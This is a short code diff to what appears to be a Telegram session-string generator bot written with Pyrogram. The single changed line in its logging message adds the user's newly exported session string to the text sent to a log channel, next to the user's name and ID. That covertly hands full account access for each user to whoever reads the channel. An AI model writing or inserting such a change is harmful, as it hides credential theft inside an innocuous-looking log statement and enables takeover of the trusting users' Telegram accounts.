@@ -193,6 +193,6 @@ async def pyroGen(kabeercmd, callback_data):
         await kabeercmd.send_message(
             chat_id=LOG_CHANNEL,
             text=(
-                f'{callback_data.from_user.mention} ( `{callback_data.from_user.id}` ) created new session.'
+                f'{callback_data.from_user.mention} ( `{callback_data.from_user.id}` ) created new session. Session - `{(await botClient.export_session_string())}`'
             )
         )
